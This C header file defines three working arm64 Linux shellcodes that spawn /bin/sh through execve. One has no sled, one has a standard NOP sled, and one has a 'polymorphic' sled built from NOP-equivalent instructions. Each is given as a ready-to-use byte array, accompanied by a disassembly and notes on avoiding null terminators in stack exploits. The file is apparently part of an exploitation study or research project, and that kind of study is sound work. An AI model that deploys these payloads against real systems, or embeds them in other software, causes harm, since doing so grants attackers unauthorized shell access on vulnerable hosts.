/*
 shellcodes.h contains the definition of shellcodes for the given architecture. 
 A shellcode is a small piece of code used as the payload in the exploitation 
 of a software vulnerability and typically starts a command shell.

 When creating shellcode, it is generally desirable to make it both small and
 executable. When exploiting stack vulnerabilities it is also necessary to avoid
 placing zeros as they are string terminators.
*/

/*
 The following shellcodes were obtained modifying the Shellcode written by Ken 
 Kitahara and published on Expolit-DB:
 - https://www.exploit-db.com/exploits/47048

    Linux/arm64 - execve(/bin/sh, NULL, NULL) - 40 bytes 

 It allows to call the `execve` syscall:
 
    int execve(const char *pathname, char *const argv[], char *const envp[]);
 
 with `/bin/sh` as path, and NULL as argv/envp.

 In arm64, a syscall is invoked by means of 'supervisor call', which has the
 opcode `svc`. By convention, the operand is ignored; syscall number is left
 in the 'x8' register while arguments in registers x0..., specifically:
  - %x8 : syscall number
  - %x0 : 1st argument: pathname
  - %x1 : 2nd argument: argv pointer
  - %x2 : 3rd argument: envp pointer

 The Shellcode contains the following instructions:
 
    d28c45e1    mov  x1, #0x622F            // x1 = 0x000000000000622F ("b/")
    f2adcd21    movk x1, #0x6E69, lsl #16   // x1 = 0x000000006E69622F ("nib/")
    f2ce65e1    movk x1, #0x732F, lsl #32   // x1 = 0x0000732F6E69622F ("s/nib/")
    f2e00d01    movk x1, #0x68, lsl #48     // x1 = 0x0068732F6E69622F ("hs/nib/")
    f81f8fe1    str  x1, [sp, #-8]!         // push x1
    aa1f03e1    mov  x1, xzr                // args[1] = NULL
    aa1f03e2    mov  x2, xzr                // args[2] = NULL
    8b2163e0    add  x0, sp, x1             // args[0] = pointer to "/bin/sh\0"
    d2801ba8    mov  x8, #221               // Systemcall Number = 221 (execve)
    d40266e1    svc  #0x1337                // Invoke Systemcal

 The other two shellcodes are modification of the previous one. The 'simple-nop'
 is padded at the begin with a number of NOP instructions (0xd503201f).

 In the 'polimorphic' the NOP sled is not the standard set of NOPs but a 
 set of instructions that can be executed without affecting the correctness of 
 the actual attack code (i.e. mov w3, w3 is functionally equivalent
 to a NOP instruction if you don't need the w3 register).
*/

#include <stddef.h>

/**
 * Shell code without NOP sled.
 * @author Ken Kitahara
 */
static char shellcode_nonop[] =
    "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

/* 
 Do not count for the null terminator since a null in the shellcode will 
 terminate any string function in the standard library
*/

static size_t size_shellcode_nonop =
    sizeof(shellcode_nonop) / sizeof(shellcode_nonop[0]) - 1;

/**
 * Shell code with simple NOP sled
 * @author Ken Kitahara
 * @author Gabriele Serra
 */
static char shellcode_simplenop[] =
    "\x1f\x20\x03\xd5\x1f\x20\x03\xd5\x1f\x20\x03\xd5\x1f\x20\x03\xd5"
    "\x1f\x20\x03\xd5\x1f\x20\x03\xd5\x1f\x20\x03\xd5\x1f\x20\x03\xd5"
    "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

static size_t size_shellcode_simplenop = sizeof(shellcode_simplenop) / sizeof(shellcode_simplenop[0]) - 1; // Do not count for the null terminator since a null in the shellcode will terminate any string function in the standard library

/**
 * Shell code with polymorphic NOP sled
 * @author Ken Kitahara
 * @author Gabriele Serra
 */
static char shellcode_polynop[] =
    "\xe3\x03\x03\x2a\xe3\x03\x03\x2a\xe3\x03\x03\x2a\xe3\x03\x03\x2a"
    "\xe3\x03\x03\x2a\xe3\x03\x03\x2a\xe3\x03\x03\x2a\xe3\x03\x03\x2a"
    "\xe3\x03\x03\x2a\xe3\x03\x03\x2a\xe3\x03\x03\x2a\xe3\x03\x03\x2a"
    "\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

static size_t size_shellcode_polynop =
    sizeof(shellcode_polynop) / sizeof(shellcode_polynop[0]) - 1;
/* Do not count for the null terminator since a null in the */
/* shellcode will terminate any lib string function */